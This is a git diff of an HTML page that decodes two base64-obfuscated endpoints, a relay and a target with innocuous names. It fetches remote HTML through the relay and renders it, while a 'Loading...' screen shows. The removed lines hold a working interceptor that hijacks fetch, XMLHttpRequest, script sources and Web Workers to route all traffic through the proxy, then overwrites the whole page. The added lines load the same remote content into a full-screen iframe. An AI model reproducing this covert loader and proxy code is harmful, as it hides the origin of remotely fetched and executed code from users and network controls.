@@ -14,6 +14,11 @@ html, body {
   color: #fff;
   font-family: sans-serif;
 }
+#x1 {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
 #x2 {
   position: absolute;
   top: 50%;
@@ -24,13 +29,13 @@ html, body {
 </head>
 <body>
 <div id="x2">Loading...</div>
+<iframe id="x1"></iframe>
 <script>
 (function() {
   function decodeBase64(str) {
     return decodeURIComponent(escape(atob(str)));
   }
 
-  // Base64 encoded target endpoints
   const encodedRelay = "aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw";
   const encodedTarget = "aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==";
 
@@ -45,69 +50,18 @@ html, body {
       return response.text();
     })
     .then(function(html) {
-      const interceptor = `
-      <script>
-      (function() {
-          const PROXY_BASE = "${relayBase}/api/relay?url=";
-          const TARGET_BASE = "${targetOrigin}/";
-          
-          function rewrite(u) {
-              if (!u || typeof u !== 'string') return u;
-              if (u.startsWith('blob:') || u.startsWith('data:') || u.startsWith(PROXY_BASE)) return u;
-              try {
-                  const abs = new URL(u, TARGET_BASE).href;
-                  return PROXY_BASE + encodeURIComponent(abs);
-              } catch(e) {
-                  return u;
-              }
-          }
-
-          const oldFetch = window.fetch;
-          window.fetch = async function(...args) {
-              if (typeof args[0] === 'string') args[0] = rewrite(args[0]);
-              else if (args[0] && args[0].url) args[0] = new Request(rewrite(args[0].url), args[0]);
-              return oldFetch.apply(this, args);
-          };
-
-          const oldOpen = XMLHttpRequest.prototype.open;
-          XMLHttpRequest.prototype.open = function(...args) {
-              if (args[1]) args[1] = rewrite(args[1]);
-              return oldOpen.apply(this, args);
-          };
-
-          const scriptDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
-          if (scriptDesc) {
-              Object.defineProperty(HTMLScriptElement.prototype, 'src', {
-                  set: function(val) { return scriptDesc.set.call(this, rewrite(val)); },
-                  get: function() { return scriptDesc.get.call(this); }
-              });
-          }
-
-          const oldWorker = window.Worker;
-          window.Worker = function(workerUrl, options) {
-              const rewritten = rewrite(workerUrl);
-              if (rewritten.startsWith('blob:') || rewritten.startsWith('data:')) {
-                  return new oldWorker(rewritten, options);
-              }
-              const blobCode = 'importScripts("' + rewritten + '");';
-              const blob = new Blob([blobCode], { type: 'application/javascript' });
-              return new oldWorker(URL.createObjectURL(blob), options);
-          };
-      })();
-      <\/script>
-      `;
-
+      document.getElementById("x2").style.display = "none";
+        
+      // Inject base tag ONLY so relative links on the main dashboard resolve correctly
       let processed = html;
+      const baseTag = '<base href="' + targetOrigin + '/">';
       if (processed.toLowerCase().includes('<head>')) {
-          processed = processed.replace(/<head>/i, '<head>\n' + interceptor);
+        processed = processed.replace(/<head>/i, '<head>\n' + baseTag);
       } else {
-          processed = interceptor + '\n' + processed;
+        processed = baseTag + '\n' + processed;
       }
 
-      // Overwrites top document directly; no iframe node remains in the DOM tree
-      document.open();
-      document.write(processed);
-      document.close();
+      document.getElementById("x1").srcdoc = processed;
     })
     .catch(function(err) {
       console.log("error", err);
